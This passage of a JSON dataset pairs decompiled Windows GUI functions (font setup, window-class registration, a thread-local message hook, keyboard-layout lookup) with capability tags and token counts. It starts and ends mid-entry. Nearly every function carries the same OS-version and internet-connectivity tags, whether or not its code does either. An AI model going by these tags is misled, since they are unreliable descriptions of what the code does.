in_EAX;\n    *(iVar1 + 8) = 0x44362c;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uVar4;\n    }\n    return in_EAX;\n}\n",
        "token_count": 777
    },
    "00443240": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00443240(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x68) != *(in_EAX + 0x74)) && (*(in_EAX + 0x74) = *(in_EAX + 0x68),  *(in_EAX + 0x9a) != 0)) {\n        (**(in_EAX + 0x98))();\n    }\n    if ((*(in_EAX + 100) != *(in_EAX + 0x70)) && (*(in_EAX + 0x70) = *(in_EAX + 100),  *(in_EAX + 0x92) != 0)) {\n        (**(in_EAX + 0x90))();\n    }\n    return;\n}\n",
        "token_count": 175
    },
    "004432c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004432c4(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.0041991c();\n    fcn.0041991c();\n    fcn.004465f4();\n    if ((*(*(in_EAX + 0x50) + 8) == 0) && (*(*0x497c14 + 0x84) != 0)) {\n        fcn.00459154();\n    }\n    return;\n}\n",
        "token_count": 102
    },
    "00443410": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00443410(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack672;\n    uint uStack668;\n    uchar *puStack664;\n    uint uStack656;\n    uint uStack636;\n    uint uStack628;\n    uint uStack624;\n    uchar *puStack620;\n    uint var_260h;\n    uint var_25ch;\n    uint var_258h;\n    uint var_254h;\n    uint var_214h;\n    uint lpList;\n    int32_t *var_14h;\n    int32_t var_10h;\n    uint hKey;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack620 = &stack0xfffffffc;\n    uStack624 = 0x4435bb;\n    uStack628 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffd8c;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x34) == 0) {\n        var_4h = in_EAX;\n        uVar3 = fcn.00404610();\n        *(var_4h + 0x34) = uVar3;\n        fcn.0040546c();\n        uStack636 = 0x40;\n        iVar4 = sub.user32.dll_GetKeyboardLayoutList();\n        if (-1 < iVar4 + -1) {\n            var_14h = &fcn.00443410::lpList;\n            var_10h = iVar4;\n            do {\n                cVar2 = fcn.0045ce74();\n                if (cVar2 != '\\0') {\n                    uStack656 = 0x4434c8;\n                    uStack656 = fcn.0040aefc(0);\n                    uStack636 = 0x80000002;\n                    puStack664 = 0x4434d3;\n                    iVar4 = sub.advapi32.dll_RegOpenKeyExA_1();\n                    if (iVar4 == 0) {\n                        uStack668 = 0x443577;\n                        uStack672 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xfffffd60;\n                        var_8h = 0x100;\n                        uVar3 = hKey;\n                        puStack664 = &stack0xfffffffc;\n                        iVar4 = sub.advapi32.dll_RegQueryValueExA_1\n                                          (hKey, 0x443604, 0, 0, &fcn.00443410::var_214h, &fcn.00443410::var_8h);\n                        if (iVar4 == 0) {\n                            fcn.004056dc();\n                            (**(**(var_4h + 0x34) + 0x3c))();\n                            if (*var_14h == *(var_4h + 0x3c)) {\n                                fcn.004056dc();\n                            }\n                        }\n                        *in_FS_OFFSET = uVar3;\n                        sub.advapi32.dll_RegCloseKey_1(hKey, 0x44357e);\n                        return;\n                    }\n                }\n                var_14h = var_14h + 1;\n                var_10h = var_10h + -1;\n            } while (var_10h != 0);\n        }\n        *(*(var_4h + 0x34) + 0x25) = 0;\n        fcn.0041b530();\n        puVar1 = puStack620;\n    }\n    puStack620 = puVar1;\n    *in_FS_OFFSET = uStack636;\n    uStack628 = 0x4435c2;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 837
    },
    "0044375c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0044375c(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint *puStack464;\n    int32_t iStack424;\n    uint uStack420;\n    uchar *puStack416;\n    uint var_191h;\n    uint var_f1h;\n    uint var_b5h;\n    uint pvParam;\n    uint var_1h;\n    \n    puStack416 = &var_1h + 1;\n    var_1h._0_1_ = 0;\n    if (*0x497c14 != 0) {\n        var_1h._0_1_ = *(*0x497c14 + 0x88);\n    }\n    uStack420 = 0x4438a3;\n    iStack424 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack424;\n    puVar1 = &var_1h + 1;\n    if (*0x497c14 != 0) {\n        fcn.004461cc();\n        puVar1 = puStack416;\n    }\n    puStack416 = puVar1;\n    iVar2 = sub.user32.dll_SystemParametersInfoA(0x1f, 0x3c, &pvParam, 0);\n    if (iVar2 == 0) {\n        sub.gdi32.dll_GetStockObject(0xd);\n        fcn.004241ec();\n    }\n    else {\n        sub.gdi32.dll_CreateFontIndirectA(&pvParam);\n        fcn.004241ec();\n    }\n    var_191h = 0x154;\n    iVar2 = sub.user32.dll_SystemParametersInfoA(0x29, 0, &var_191h, 0);\n    if (iVar2 == 0) {\n        fcn.004242d0();\n        puStack464 = 0xd;\n        sub.gdi32.dll_GetStockObject();\n        fcn.004241ec();\n    }\n    else {\n        puStack464 = &var_b5h;\n        sub.gdi32.dll_CreateFontIndirectA();\n        fcn.004241ec();\n        sub.gdi32.dll_CreateFontIndirectA(&var_f1h);\n        fcn.004241ec();\n    }\n    fcn.00423f70();\n    fcn.00423f70();\n    *in_FS_OFFSET = puStack464;\n    if (*0x497c14 != 0) {\n        fcn.004461cc(0x4438aa);\n    }\n    return;\n}\n",
        "token_count": 580
    },
    "004438b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004438b8(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x8c) = *(in_EAX + 0x8c) + -1;\n    if ((*(in_EAX + 0x8c) == 0) && ((*(in_EAX + 0x8e) & 0x10) != 0)) {\n        fcn.004438d8();\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "00443968": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00443968(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    char in_DL;\n    int32_t iVar3;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    iVar3 = *(*(arg_8h + -4) + 8) - **(arg_8h + -4);\n    if ((iVar3 < 0) || (in_DL - 3U < 2)) {\n        iVar3 = in_EAX[0x12];\n    }\n    var_10h = *(*(arg_8h + -4) + 0xc) - *(*(arg_8h + -4) + 4);\n    if ((var_10h < 0) || (in_DL - 1U < 2)) {\n        var_10h = in_EAX[0x13];\n    }\n    if ((in_DL == '\\x01') && (*(in_EAX + 0x273) == '\\x02')) {\n        var_8h = fcn.0043d3b4();\n        var_ch = fcn.0043d3d4();\n        iVar3 = (***0x492750)(0x3d);\n    }\n    else {\n        var_8h = **(arg_8h + -4);\n        var_ch = *(*(arg_8h + -4) + 4);\n    }\n    if (in_DL == '\\x01') {\n        piVar1 = *(arg_8h + -4) + 4;\n        *piVar1 = *piVar1 + var_10h;\n    }\n    else if (in_DL == '\\x02') {\n        piVar1 = *(arg_8h + -4) + 0xc;\n        *piVar1 = *piVar1 - var_10h;\n        var_ch = *(*(arg_8h + -4) + 0xc);\n    }\n    else if (in_DL == '\\x03') {\n        **(arg_8h + -4) = **(arg_8h + -4) + iVar3;\n    }\n    else if (in_DL == '\\x04') {\n        piVar1 = *(arg_8h + -4) + 8;\n        *piVar1 = *piVar1 - iVar3;\n        var_8h = *(*(arg_8h + -4) + 8);\n    }\n    (**(*in_EAX + 0x88))(var_10h, iVar3);\n    if (*(in_EAX + 0x273) == '\\x02') {\n        iVar3 = iVar3 - var_8h;\n        var_10h = var_10h - var_ch;\n    }\n    iVar2 = in_EAX[0x12];\n    if ((iVar3 != iVar2) || (in_EAX[0x13] != var_10h)) {\n    // switch table (6 cases) at 0x443aae\n        switch(in_DL) {\n        case '\\x01':\n            piVar1 = *(arg_8h + -4) + 4;\n            *piVar1 = *piVar1 - (var_10h - in_EAX[0x13]);\n            break;\n        case '\\x02':\n            piVar1 = *(arg_8h + -4) + 0xc;\n            *piVar1 = *piVar1 + (var_10h - in_EAX[0x13]);\n            break;\n        case '\\x03':\n            **(arg_8h + -4) = **(arg_8h + -4) - (iVar3 - iVar2);\n            break;\n        case '\\x04':\n            piVar1 = *(arg_8h + -4) + 8;\n            *piVar1 = *piVar1 + (iVar3 - iVar2);\n            break;\n        case '\\x05':\n            piVar1 = *(arg_8h + -4) + 8;\n            *piVar1 = *piVar1 + (iVar3 - iVar2);\n            piVar1 = *(arg_8h + -4) + 0xc;\n            *piVar1 = *piVar1 + (var_10h - in_EAX[0x13]);\n        }\n    }\n    return;\n}\n",
        "token_count": 990
    },
    "00443b24": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00443b24(int32_t arg_8h)\n\n{\n    char in_AL;\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_8h;\n    uint var_1h;\n    \n    (**(**(arg_8h + -8) + 8))();\n    if ((((*(arg_8h + -0xc) != 0) && (*(*(arg_8h + -0xc) + 0x30) == 0)) && ((*(*(arg_8h + -0xc) + 0x1c) & 0x10) == 0))\n       && (((*(*(arg_8h + -0xc) + 0x57) != '\\0' && (*(*(arg_8h + -0xc) + 0x5b) == in_AL)) &&\n           (*(*(arg_8h + -0xc) + 0x273) != '\\x01')))) {\n        fcn.00419680();\n    }\n    iVar2 = fcn.00443238();\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = fcn.00443224();\n            if (((*(iVar3 + 0x30) == 0) && (*(iVar3 + 0x5b) == in_AL)) &&\n               (((*(iVar3 + 0x1c) & 0x10) == 0 &&\n                (((*(iVar3 + 0x57) != '\\0' && (*(iVar3 + 0x273) != '\\x01')) && (iVar3 != *(arg_8h + -0xc))))))) {\n                for (iVar3 = 0; iVar3 < *(*(arg_8h + -8) + 8); iVar3 = iVar3 + 1) {\n                    fcn.004197d8();\n                    cVar1 = fcn.004438e0();\n                    if (cVar1 != '\\0') break;\n                }\n                fcn.00419854();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    iVar2 = *(*(arg_8h + -8) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = arg_8h;\n            fcn.004197d8();\n            fcn.00443968(iVar3);\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 574
    },
    "00443c74": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00443c74(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00443238();\n    iVar1 = iVar1 + -1;\n    if (-1 < iVar1) {\n        do {\n            iVar2 = fcn.00443224();\n            if ((((*(iVar2 + 0x30) == 0) && ((*(iVar2 + 0x1c) & 0x10) == 0)) && (*(iVar2 + 0x5b) != '\\0')) &&\n               ((*(iVar2 + 0x57) != '\\0' && (*(iVar2 + 0x273) != '\\x01')))) {\n                return 1;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    return 0;\n}\n",
        "token_count": 198
    },
    "00443d54": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00443d54(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    int32_t var_4h;\n    \n    if (*(in_EAX + 0x8c) != 0) {\n        *(in_EAX + 0x8e) = *(in_EAX + 0x8e) | 0x10;\n        return;\n    }\n    puStack32 = 0x443d82;\n    var_4h = in_EAX;\n    fcn.004438b0();\n    uStack36 = 0x443dcd;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uVar1 = 0x30;\n    puStack32 = &stack0xfffffffc;\n    sub.user32.dll_SystemParametersInfoA(0x30, 0, &fcn.00443d54::var_14h, 0);\n    fcn.00443ccc();\n    *in_FS_OFFSET = uVar1;\n    *(var_4h + 0x8e) = *(var_4h + 0x8e) & 0xffef;\n    fcn.004438b8(0x443dd4);\n    return;\n}\n",
        "token_count": 311
    },
    "00443de8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00443de8(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        do {\n            if (*(in_EAX + 0x84) != 0) {\n                fcn.004054c0();\n                return;\n            }\n            in_EAX = *(in_EAX + 0x30);\n        } while (in_EAX != 0);\n    }\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 107
    },
    "00443e20": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00443e20(void)\n\n{\n    int32_t in_EAX;\n    \n    for (; (in_EAX != 0 && (*(in_EAX + 0x8d) == '\\0')); in_EAX = *(in_EAX + 0x30)) {\n    }\n    return;\n}\n",
        "token_count": 68
    },
    "00443e40": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00443e40(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    if (*0x497c14 != 0) {\n        uStack24 = 0x443e71;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack28;\n        fcn.00446828();\n        *in_FS_OFFSET = uStack28;\n    }\n    return;\n}\n",
        "token_count": 120
    },
    "00443e94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00443e94(void)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    \n    *0x497c28 = sub.kernel32.dll_GetCurrentThreadId_1();\n    while( true ) {\n        iVar1 = sub.kernel32.dll_WaitForSingleObject();\n        if (iVar1 != 0x102) break;\n        if (*0x497c14 != 0) {\n            if (*(*0x497c14 + 0x60) != 0) {\n                sub.user32.dll_GetCursorPos();\n                iVar1 = fcn.0044e208();\n                if (iVar1 == 0) {\n                    fcn.004468d4();\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 163
    },
    "00443ef0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00443ef0(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_CallNextHookEx(*0x497c30, arg_8h, arg_ch, arg_10h);\n    if ((-1 < arg_8h) && (*0x497c14 != 0)) {\n        fcn.00445800();\n    }\n    return uVar1;\n}\n",
        "token_count": 110
    },
    "00443f34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00443f34(void)\n\n{\n    uint uStack20;\n    code *pcStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    if (*(*0x497c14 + 0xad) == '\\0') {\n        if (*0x497c30 == 0) {\n            uStack8 = 0x443f51;\n            uStack8 = sub.kernel32.dll_GetCurrentThreadId_1();\n            uStack12 = 0;\n            pcStack16 = fcn.00443ef0;\n            uStack20 = 3;\n            *0x497c30 = sub.user32.dll_SetWindowsHookExA();\n        }\n        if (*0x497c2c == 0) {\n            *0x497c2c = sub.kernel32.dll_CreateEventA(0, 0, 0, 0);\n        }\n        if (*0x497c34 == 0) {\n            *0x497c34 = sub.kernel32.dll_CreateThread(0, 1000, fcn.00443e94, 0, 0, &stack0xffffffec);\n        }\n    }\n    return;\n}\n",
        "token_count": 252
    },
    "00443fa8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "set application hook"
        ],
        "decompiled_code": "\nvoid fcn.00443fa8(void)\n\n{\n    int32_t iVar1;\n    \n    if (*0x497c30 != 0) {\n        sub.user32.dll_UnhookWindowsHookEx(*0x497c30);\n    }\n    *0x497c30 = 0;\n    if (*0x497c34 != 0) {\n        sub.kernel32.dll_SetEvent(*0x497c2c);\n        iVar1 = sub.kernel32.dll_GetCurrentThreadId_1();\n        if (iVar1 != *0x497c28) {\n            sub.kernel32.dll_WaitForSingleObject(*0x497c34, 0xffffffff);\n        }\n        sub.kernel32.dll_CloseHandle_1(*0x497c34);\n        *0x497c34 = 0;\n    }\n    return;\n}\n",
        "token_count": 175
    },
    "00444004": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.00444004(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint auStack8 [2];\n    \n    auStack8[0] = 8;\n    uVar2 = 8;\n    uVar1 = sub.user32.dll_SystemParametersInfoA(0x48, 8, auStack8, 0);\n    if (uVar1 != 0) {\n        return CONCAT44(uVar2, uVar1 & 0xffffff00 | uVar2 != 0);\n    }\n    return uVar2 << 0x20;\n}\n",
        "token_count": 134
    },
    "00444178": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\ncode * __fastcall fcn.00444178(uint param_1, char param_2)\n\n{\n    code **ppcVar1;\n    code *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar5;\n    uint lpFilename;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    var_1h._0_1_ = param_2;\n    fcn.0041f838();\n    ppcVar1 = *0x492848;\n    if (*(*0x492848 + 2) == 0) {\n        (*0x492848)[1] = in_EAX;\n        *ppcVar1 = fcn.00445bd4;\n    }\n    ppcVar1 = *0x492954;\n    if (*(*0x492954 + 2) == 0) {\n        (*0x492954)[1] = in_EAX;\n        *ppcVar1 = fcn.00445de0;\n    }\n    in_EAX[0x34] = 0x0;\n    uVar2 = fcn.00404610();\n    *(in_EAX + 0x90) = uVar2;\n    uVar2 = fcn.00404610();\n    *(in_EAX + 0x98) = uVar2;\n    uVar2 = fcn.00404610();\n    *(in_EAX + 0xb0) = uVar2;\n    *(in_EAX + 0x60) = 0;\n    *(in_EAX + 0x84) = 0;\n    *(in_EAX + 0x5c) = 0xff000018;\n    *(in_EAX + 0x78) = 500;\n    in_EAX[0x7c] = 0x1;\n    *(in_EAX + 0x80) = 0;\n    *(in_EAX + 0x74) = 0x9c4;\n    in_EAX[0x88] = 0x0;\n    in_EAX[0xa5] = 0x1;\n    in_EAX[0xbc] = 0x1;\n    uVar2 = fcn.0042a674();\n    *(in_EAX + 0xa0) = uVar2;\n    sub.user32.dll_LoadIconA(**0x49272c, 0x444388);\n    fcn.0042aa48();\n    iVar3 = *(in_EAX + 0xa0);\n    *(iVar3 + 0x14) = in_EAX;\n    *(iVar3 + 0x10) = 0x4464a4;\n    sub.kernel32.dll_GetModuleFileNameA_1(**0x49272c, &lpFilename, 0x100);\n    sub.user32.dll_OemToCharA(&lpFilename, &lpFilename);\n    iVar3 = fcn.0040e9ac();\n    if (iVar3 != 0) {\n        fcn.0040a8a0();\n    }\n    puVar4 = fcn.0040e9e0();\n    if (puVar4 != NULL) {\n        *puVar4 = 0;\n    }\n    uVar2 = sub.user32.dll_CharNextA_1(&lpFilename);\n    sub.user32.dll_CharLowerA(uVar2);\n    fcn.004056dc();\n    in_EAX[0xd4] = 0x0;\n    uVar5 = 0x4458a0;\n    uVar2 = fcn.004209b4(0x4458a0, in_EAX);\n    *(in_EAX + 200) = uVar2;\n    if (**0x4925d4 == '\\0') {\n        fcn.004444cc();\n    }\n    in_EAX[0x59] = 0x1;\n    in_EAX[0x5a] = 0x1;\n    in_EAX[0x5b] = 0x1;\n    in_EAX[0xa6] = 0x1;\n    *(in_EAX + 0xa8) = 0;\n    fcn.0044667c();\n    fcn.004471e0();\n    if (var_1h != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uVar5;\n    }\n    return in_EAX;\n}\n",
        "token_count": 1036
    },
    "004444cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004444cc(void)\n\n{\n    int16_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_2ch;\n    uint lpWndClass;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    puStack56 = &stack0xfffffffc;\n    uStack60 = 0x444668;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    if ((*(in_EAX + 0xac) == '\\0') && (**0x4929b0 == '\\0')) {\n        uVar2 = fcn.004208f8(fcn.00444ce4, in_EAX);\n        *(in_EAX + 0x40) = uVar2;\n        *0x4915e4 = sub.user32.dll_DefWindowProcA;\n        iVar3 = sub.user32.dll_GetClassInfoA(*0x4957f8, *0x491604, &fcn.004444cc::lpWndClass);\n        if (iVar3 == 0) {\n            *0x4915f0 = *0x4957f8;\n            iVar1 = sub.user32.dll_RegisterClassA(0x4915e0);\n            if (iVar1 == 0) {\n                fcn.004075f4();\n                fcn.0040da70();\n                fcn.00404eb4();\n            }\n        }\n        uVar4 = (***0x492750)(0, 0x84ca0000);\n        iVar3 = uVar4 >> 1;\n        if (iVar3 < 0) {\n            iVar3 = iVar3 + ((uVar4 & 1) != 0);\n        }\n        uVar4 = (***0x492750)(1, iVar3);\n        uVar2 = *0x4957f8;\n        iVar3 = uVar4 >> 1;\n        if (iVar3 < 0) {\n            iVar3 = iVar3 + ((uVar4 & 1) != 0);\n        }\n        fcn.004058fc();\n        uVar2 = fcn.004085a8(0, uVar2, 0, 0, 0, 0, iVar3, in_stack_00000030, in_stack_00000034);\n        *(in_EAX + 0x30) = uVar2;\n        *(in_EAX + 0xac) = 1;\n        uStack20 = *(in_EAX + 0x30);\n        sub.user32.dll_SetWindowLongA();\n        if (**0x4927f4 != '\\0') {\n            fcn.0044538c();\n            uStack8 = *(in_EAX + 0x30);\n            uStack12 = 0x444601;\n            sub.user32.dll_SendMessageA();\n            uStack12 = 0x444608;\n            uStack12 = fcn.0044538c();\n            uStack16 = 0xfffffff2;\n            uStack20 = *(in_EAX + 0x30);\n            uStack24 = 0x444614;\n            sub.user32.dll_SetClassLongA();\n        }\n        uStack24 = 0;\n        uStack28 = *(in_EAX + 0x30);\n        uStack32 = 0x44461f;\n        uVar2 = sub.user32.dll_GetSystemMenu();\n        uStack32 = 0;\n        uStack36 = 0xf030;\n        lpWndClass = 0x44462e;\n        uStack40 = uVar2;\n        sub.user32.dll_DeleteMenu();\n        lpWndClass = 0;\n        puStack56 = 0x44463b;\n        uStack64 = uVar2;\n        sub.user32.dll_DeleteMenu();\n        if (**0x4927f4 != '\\0') {\n            puStack56 = NULL;\n            uStack60 = 0xf010;\n            uStack64 = uVar2;\n            sub.user32.dll_DeleteMenu();\n        }\n    }\n    *in_FS_OFFSET = uStack64;\n    puStack56 = 0x44466f;\n    uStack60 = 0x444667;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 1023
    },
    "004446d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004446d4(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    \n    uVar3 = 0xffffffff;\n    if (*0x497c14 == 0) {\n        return 0xffffffff;\n    }\n    iVar1 = sub.user32.dll_GetWindow(arg_8h, 4);\n    if (iVar1 == *(*0x497c14 + 0x30)) {\n        uVar2 = sub.user32.dll_GetWindowLongA(arg_8h, 0xffffffec);\n        if (((uVar2 & 8) == 0) ||\n           (((*(*0x497c14 + 0x44) != 0 && (*(arg_ch + 1) == '\\0')) && (iVar1 = fcn.00457a28(),  arg_8h == iVar1)))) {\n            *arg_ch = arg_8h;\n            uVar3 = 0;\n        }\n        else {\n            fcn.00419680();\n        }\n        return uVar3;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 255
    },
    "0044474c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
